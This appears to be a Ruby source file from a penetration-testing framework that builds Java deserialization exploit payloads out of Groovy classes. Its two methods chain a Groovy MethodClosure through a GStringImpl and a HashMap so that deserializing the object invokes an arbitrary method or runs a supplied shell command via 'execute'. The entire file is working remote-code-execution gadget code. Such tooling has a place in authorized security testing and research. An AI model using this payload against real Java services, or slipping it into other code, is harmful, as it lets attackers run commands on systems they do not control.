# -*- coding: binary -*-
require 'rex/java/serialization/metamodel'
require_relative 'util'

module Rex
  module Java
    module Serialization
      module Payloads
        class Groovy
          def self.make_invoke_noarg(obj, method)
            closure = Model::JavaObject.new('Lorg/codehaus/groovy/runtime/MethodClosure;', 
                                                      'owner' => obj,
                                                      'method' => method,
                                                      'maximumNumberOfParameters' => 0,
                                                      'parameterTypes' => Model::JavaArray.new('Ljava/lang/Class;', []))

            str = Model::JavaObject.new('Lorg/codehaus/groovy/runtime/GStringImpl;', 
                                                  'strings' => Model::JavaArray.new('Ljava/lang/String;', ['a']),
                                                  'values' => Model::JavaArray.new('Ljava/lang/Object;', [closure]))

            Model::JavaObject.new('Ljava/util/HashMap;', 'elements' => { str => nil, str => nil })
          end

          def self.make_runtime_exec(cmd)
            closure = Model::JavaObject.new('Lorg/codehaus/groovy/runtime/MethodClosure;', 
                                                      'owner' => cmd,
                                                      'method' => 'execute',
                                                      'maximumNumberOfParameters' => 0,
                                                      'parameterTypes' => Model::JavaArray.new('Ljava/lang/Class;', []))

            str = Model::JavaObject.new('Lorg/codehaus/groovy/runtime/GStringImpl;', 
                                                  'strings' => Model::JavaArray.new('Ljava/lang/String;', ['a']),
                                                  'values' => Model::JavaArray.new('Ljava/lang/Object;', [closure]))

            Model::JavaObject.new('Ljava/util/HashMap;', 'elements' => { str => nil, str => nil })
          end
        end
      end
    end
  end
end
